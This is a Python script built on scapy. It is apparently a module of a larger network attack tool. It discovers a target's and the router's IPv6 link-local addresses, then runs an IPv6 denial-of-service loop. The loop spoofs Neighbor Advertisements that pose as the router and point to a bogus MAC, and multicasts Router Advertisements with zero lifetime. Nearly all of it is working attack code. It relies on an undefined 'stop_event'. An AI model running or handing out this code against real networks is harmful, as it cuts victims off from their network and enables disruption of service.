from scapy.all import Ether, sniff
import time 
from utils import utilities
from scapy.layers.inet6 import (
    ICMPv6EchoRequest,
    ICMPv6ND_NA,
    ICMPv6ND_RA,
    ICMPv6ND_RS,
    ICMPv6NDOptDstLLAddr,
    IPv6,
)


#Pinging on the all nodes address for the routers/general nodes to try to provoke a response
def ipv6_poke():
    rs_packet = Ether() / IPv6(dst="ff02::2") / ICMPv6ND_RS()

    ping_packet = (
        Ether(dst="33:33:00:00:00:01") / IPv6(dst="ff02::1") / ICMPv6EchoRequest()
    )

    utilities.safe_send(rs_packet)
    utilities.safe_send(ping_packet)


def poison_service(target_mac):

    #Handles discovery and then switches to the poisoning loop.

    target_v6, router_v6 = None, None
    ipv6_poke()

    def find_ips(pkt):
        #To anyone reading this, if you've worked with python long enough 
        #You know that this "nonlocal" keyword was a fun 20 minutes of me desperately 
        #Trying to understand why i was geting such weird results 
        nonlocal target_v6, router_v6
        if IPv6 in pkt:
            if pkt.haslayer(ICMPv6ND_RA):
                router_v6 = pkt[IPv6].src
            if pkt.src == target_mac:
                target_v6 = pkt[IPv6].src


    #Multicast Ping makes all nodes respond
    print("Discovering IPv6 Link-Local addresses...")
    sniff(
        filter="ip6",
        prn=find_ips,
        timeout=20,
        stop_filter=lambda x: target_v6 and router_v6,
    )

    if not target_v6 or not router_v6:
        print("IPv6 Discovery Failed. Router/Target are being too quiet!")
        return

    print(f"IPv6 DOS: Target {target_v6} | Router {router_v6}")

    #Route packets to a nonsense address
    na_packet = (
        Ether(dst=target_mac)
        / IPv6(src=router_v6, dst=target_v6)
        / ICMPv6ND_NA(tgt=router_v6, R=1, S=1, O=1)
        / ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:04")
    )

    ra_kill = (
        Ether(dst="33:33:00:00:00:01")
        / IPv6(dst="ff02::1")
        / ICMPv6ND_RA(routerlifetime=0)
    )

    while not stop_event.is_set():
        utilities.safe_send(na_packet)
        utilities.safe_send(ra_kill)
        time.sleep(0.1)
